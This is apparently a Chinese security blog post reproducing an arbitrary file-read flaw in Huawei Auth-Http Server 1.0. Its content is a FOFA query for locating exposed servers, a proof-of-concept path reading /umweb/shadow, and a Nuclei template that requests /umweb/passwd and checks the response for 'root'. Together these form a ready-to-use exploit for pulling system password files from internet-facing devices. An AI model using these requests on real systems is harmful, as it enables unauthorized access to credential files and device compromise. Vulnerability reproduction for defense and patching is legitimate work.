#  华为Auth-Http Serve任意文件读取漏洞复现   
网络安全交流圈  青澜安全团队   2023-11-24 17:49  
  
****  
  
**漏洞描述：**  
  
   
**Huawei Auth-Http任意文件泄露漏洞，攻击者可构造恶意请求获取系统信息等及其它安全风险。**  
  
**FOFA:**  
```
server="Huawei Auth-Http Server 1.0"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1ZzmH7NBcG7LjbnJWYBftSfhWK7fnvkGWadOM3icWqSlxEicHk82Qm2Ktibgo6SVWLWzVm5TIsdsDvGWjvzfuRMyA/640?wx_fmt=png&from=appmsg "")  
  
****  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1ZzmH7NBcG7LjbnJWYBftSfhWK7fnvkG0eJqzbWkBIcgDHBuria4icbic1iayEErZEe4gN5P3cRPJiaTCsB7yRlYZXA/640?wx_fmt=png&from=appmsg "")  
  
POC：来源于互联网  
```
/umweb/shadow
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1ZzmH7NBcG7LjbnJWYBftSfhWK7fnvkGVtExdu7O40fPkGXp3I1mHJlIMA4OwVkWJHpZmHRekRvHx8icqRMiaSfw/640?wx_fmt=png&from=appmsg "")  
```
id: huanwei-auth-http-server-fileread

info:
name: 华为Auth-Http Server 1.0任意文件读取
author:
severity: medium
description: 华为Auth-Http Server 1.0任意文件读取，攻击者可通过此漏洞获取敏感信息。

reference:
- https://
metadata:
fofa-query: server="Huawei Auth-Http Server 1.0"
verified: true
max-request: 1

http:
- raw:
- |
GET /umweb/passwd HTTP/1.1
Host: {{Hostname}}


matchers:
- type: dsl
dsl:
- 'status_code==200 && contains_all(body,"root")'

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1ZzmH7NBcG7LjbnJWYBftSfhWK7fnvkGKbxUrkcEiaceFWtz0soCxO2VKhYqparciclu8E15tSmibZicmickZFU1UpQ/640?wx_fmt=png&from=appmsg "")  
  
  
欢迎添加微信进行业务咨询：![](https://mmbiz.qpic.cn/sz_mmbiz_png/1ZzmH7NBcG7gqeIdG5PgEfStMv2NjgTtLFibNg95agAOlNJGerlYBIL5icrjdRQgn7kPKB9xDkk37ZHTXEiaNPPpw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
承接以下业务：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1ZzmH7NBcG6A6H4s2wQyk10Hg7M4kkTkTibpaia4ar7KlgSicXVFnicKPl8CWXbEKVlvManAicrjReV9aw5icJxxamFw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
